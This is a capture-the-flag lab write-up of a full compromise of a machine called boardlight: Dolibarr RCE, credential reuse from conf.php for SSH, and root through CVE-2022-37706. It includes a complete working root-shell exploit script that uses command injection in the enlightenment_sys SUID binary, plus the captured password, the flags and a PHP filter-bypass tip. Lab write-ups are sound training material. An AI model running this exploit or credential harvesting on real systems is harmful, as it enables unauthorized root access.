# Privilege Escalation

## Status: ✅ COMPLETE — 2026-03-30 10:45 UTC

## Attack Chain Summary

1. **www-data** (CVE-2023-30253 Dolibarr RCE)
2. **larissa** (DB creds → SSH) ✅ — `serverfun2$2023!!`
3. **root** (CVE-2022-37706 Enlightenment LPE) ✅

---

## Path to larissa

### Step 1: Find Database Credentials (from www-data shell)
```bash
cat /var/www/html/dolibarr/htdocs/conf/conf.php
```

Found:
- Database user: `dolibarrowner`
- Database password: `serverfun2$2023!!`
- Database name: `dolibarr`

### Step 2: SSH as larissa ✅
```bash
ssh larissa@10.129.231.37
# Password: serverfun2$2023!!
```

### Step 3: Grab user.txt ✅
```
larissa@boardlight:~$ cat user.txt
614c48b5566b264002cfbfac7febe353
```

---

## Path to Root

### CVE-2022-37706 — Enlightenment Privilege Escalation ✅ EXPLOITED

**Vulnerability:** Stack-based buffer overflow in Enlightenment's `enlightenment_sys` SUID binary  
**Type:** Local Privilege Escalation  
**Affected:** Enlightenment Window Manager with SUID binary  
**Affected binary:** `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys`

### Exploitation

**1. Confirm SUID binary exists:**
```bash
find / -name enlightenment_sys -perm -4000 2>/dev/null
# Output: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
```

**2. Run the exploit (from [MaherAzzouzi/CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)):**

```bash
#!/bin/bash
echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

### Technical Explanation

The vulnerability exploits how `enlightenment_sys` handles path arguments for the `mount` command. By crafting a path containing `;/tmp/exploit`, the binary's argument parsing treats `;` as a command separator, allowing execution of `/tmp/exploit` (our created `/bin/sh` script) with elevated SUID privileges.

**Key insight:** The binary is a setuid binary that wraps `mount` with Enlightenment-specific logic, but it fails to sanitize path arguments properly, allowing command injection through directory traversal and shell metacharacters.

**Why it works:**
1. `enlightenment_sys` is SUID root
2. It accepts path arguments and passes them to `mount`
3. The path `/dev/../tmp/;/tmp/exploit` is not properly sanitized
4. The `;` acts as a command separator, executing `/tmp/exploit` as root

### Step 3: Grab root.txt ✅
```
# cd /root
# cat root.txt
74155102b929fb5df2ac7814145d6177
```

---

## Full Access Path

| Stage | User | Method | Flag |
|-------|------|--------|------|
| Initial | www-data | CVE-2023-30253 (Dolibarr RCE, plain page) | — |
| Intermediate | larissa | SSH with DB creds | `614c48b5566b264002cfbfac7febe353` ✅ |
| Root | root | CVE-2022-37706 (enlightenment_sys) | `74155102b929fb5df2ac7814145d6177` ✅ |

## Proof
- [x] user.txt (larissa) — `614c48b5566b264002cfbfac7febe353`
- [x] root.txt — `74155102b929fb5df2ac7814145d6177`

## Lessons

- **Dolibarr enum is key:** Default creds + vhost enum revealed the CRM instance
- **PHP filter bypass:** `<?PHP` (uppercase) bypasses Dolibarr's `<?php` (lowercase) filter
- **Plain page > Dynamic page:** The "plain page" website method bypassed additional restrictions in Dolibarr
- **Cred reuse:** DB password from Dolibarr conf.php → SSH for stable shell
- **Enlightenment SUID:** CVE-2022-37706 is a reliable privesc vector when enlightenment_sys is SUID

---

## Timeline
| Date | Action |
|------|--------|
| 2026-03-29 | www-data shell obtained via Dolibarr RCE |
| 2026-03-29 | SSH as larissa, user.txt captured |
| 2026-03-30 10:45 | CVE-2022-37706 exploited, root.txt captured |
